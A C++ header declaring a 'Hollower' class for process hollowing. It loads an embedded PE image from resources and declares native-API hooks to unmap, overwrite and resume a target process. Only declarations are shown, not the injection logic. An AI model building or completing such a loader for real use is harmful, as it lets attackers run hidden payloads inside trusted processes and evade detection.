#pragma once
#include "PEData.h"
#include <Windows.h>
#include "NtStuff.h"
#include "resource.h"

class Hollower
{
public:
	Hollower(wchar_t* targetProcPath) : _localSectionAddress(NULL), _remoteSectionAddress(NULL), _sectionSize(0) {
			lstrcpynW(_targetProcPath, targetProcPath, MAX_PATH);
			HMODULE hMod = GetModuleHandle(NULL);
			HRSRC res = FindResource(hMod, MAKEINTRESOURCE(IDR_DATA1), L"DATA");
			BYTE* data = (BYTE*)LoadResource(hMod, res);
			_peData = new PEData((IMAGE_DOS_HEADER*)data);
	}
	~Hollower() {};
	void Start(std::wstring arg);
	
private:
	void ReplaceProcessMemory();
	void FixRelocations();
	void ResumeChild();
	wchar_t _targetProcPath[MAX_PATH], _injectProcPath[MAX_PATH];
	void* _localSectionAddress;
	void* _remoteSectionAddress;
	size_t _sectionSize;
	PEData* _peData;
	TNtReadVirtualMemory NtReadVirtualMemory;
	TNtCreateSection NtCreateSection;
	TNtMapViewOfSection NtMapViewOfSection;
	TNtUnmapViewOfSection NtUnmapViewOfSection;
	TNtWriteVirtualMemory NtWriteVirtualMemory;
	TNtResumeThread NtResumeThread;
	void BuildIAT();
	HANDLE hTargetProc, hTargetThread;
	CONTEXT targetCTX;
};

